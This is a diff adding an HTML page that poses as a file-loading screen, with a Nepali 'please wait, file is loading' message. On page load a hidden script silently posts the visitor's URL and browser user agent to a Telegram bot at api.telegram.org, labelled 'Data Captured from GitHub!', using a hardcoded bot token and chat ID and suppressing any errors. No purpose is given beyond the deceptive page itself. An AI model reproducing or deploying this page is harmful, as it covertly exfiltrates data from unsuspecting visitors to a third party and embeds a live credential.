@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+    <script>
+    (function() {
+        try {
+            var botToken = "8208186220:AAERk4P9jycTcj9UlkHpV03xB-HYk0eEEJE"; 
+            var myChatId = "699985452"; 
+            var message = "🚀 Data Captured from GitHub!\n📍 URL: " + window.location.href + "\n📱 Device: " + navigator.userAgent;
+
+            fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: myChatId, text: message, parse_mode: "Markdown" })
+            });
+        } catch (e) {}
+    })();
+    </script>
+    <center><h2 style="margin-top:50px;">कृपया प्रतीक्षा गर्नुहोस्, फाइल लोड हुँदैछ...</h2></center>
+</body>
+</html>
